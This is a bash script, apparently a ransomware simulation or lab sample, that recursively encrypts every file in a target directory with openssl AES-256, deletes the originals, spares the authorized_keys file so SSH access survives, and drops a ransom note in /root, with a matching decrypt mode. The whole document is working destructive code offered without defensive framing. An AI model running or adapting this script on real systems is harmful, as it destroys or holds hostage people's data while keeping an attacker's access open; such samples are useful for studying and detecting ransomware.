#!/bin/bash

MODE=$1
TARGET_DIR=$2
# Encryption key can be whatever you want. I used the command:
# openssl rand -hex 32
ENCRYPTION_KEY=$3

# Function to recursively encrypt files
encrypt_file() {
  local file="$1"
  local filename=$(basename "$file")
  if [ $filename != "authorized_keys" ]; then
        openssl enc -aes-256-cbc -salt -pbkdf2 -in "$file" -out "${file}.enc" -pass pass:"$ENCRYPTION_KEY"
        if [ $? -eq 0 ]; then
          rm -f "$file"  # Remove original file after encryption
        fi
  fi
}

# Recursively decrypt the directory
decrypt_file() {
  local file="$1"
  local decrypted_file="${file%.enc}"
  local filename=$(basename "$file")
    if [ $filename != "authorized_keys" ]; then
      openssl aes-256-cbc -d -pbkdf2 -in "$file" -out "$decrypted_file" -pass pass:"$ENCRYPTION_KEY"
      if [ $? -eq 0 ]; then
        rm -f "$file"  # Remove original file after encryption
      fi
    fi
}
# Export the function
export -f encrypt_file
export -f decrypt_file

if [ $MODE == "encrypt" ]; then
        # Find and encrypt files in the target directory
        find "$TARGET_DIR" -type f -exec bash -c 'encrypt_file "$0"' {} \;
        # Save to ransom note
        echo "RANSOM NOTE" > "/root/README_FOR_DECRYPTION.txt"
elif [ $MODE == "decrypt" ]; then
        find "$TARGET_DIR" -type f -exec bash -c 'decrypt_file "$0"' {} \;
fi